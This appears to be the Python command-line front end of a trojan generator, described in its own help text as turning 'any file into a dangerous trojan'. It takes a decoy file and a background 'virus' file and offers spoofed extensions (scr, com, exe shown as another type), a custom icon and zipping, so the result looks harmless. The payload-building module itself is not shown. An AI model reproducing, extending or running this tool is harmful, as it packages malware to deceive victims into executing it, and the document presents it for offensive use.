import TrojanGenerator
import argparse
import sys


def arguments():
    parser = argparse.ArgumentParser(description="Turn any file into a dangerous trojan")
    parser.add_argument("--frontfile", help="File URL. This will be the front file (the file being displayed)", required=True)
    parser.add_argument("--backfile", help="File URL. This will be the back file (the virus running in the background)", required=True)
    parser.add_argument("--name", help="Output name", required=True)
    parser.add_argument("--real_extension", help="The real file extension. This can only be scr, com and exe")
    parser.add_argument("--spoof_extension", help="Filetype the executable will appear as")
    parser.add_argument("--icon", help="Select file icon")
    parser.add_argument("--zip", help="Boolean to zip file. Default is not zipping.", action="store_true")

    return vars(parser.parse_args())


if __name__ == "__main__":
    args = arguments()

    FRONT_FILE = args["frontfile"]
    BACK_FILE = args["backfile"]
    NAME = args["name"]
    REAL_EXTENSION = args["real_extension"]
    SPOOF_EXTENSION = args["spoof_extension"]
    ZIP = args["zip"]
    ICON = args["icon"]

    trojan = TrojanGenerator.GenerateTrojan(FRONT_FILE, BACK_FILE)

    if ICON:
        try:
            trojan.set_icon(ICON)
        except FileNotFoundError as error:
            print("\n" + str(error))
            exit(1)
        except TrojanGenerator.FileTypeError as error:
            print("\n" + str(error))
            exit(1)

    if REAL_EXTENSION:
        trojan.main_extension(REAL_EXTENSION)

    if SPOOF_EXTENSION:
        trojan.spoof_extension(SPOOF_EXTENSION)

    if ZIP:
        trojan.generate(NAME, zip_file=True)
    else:
        trojan.generate(NAME)

    trojan.cleanup()
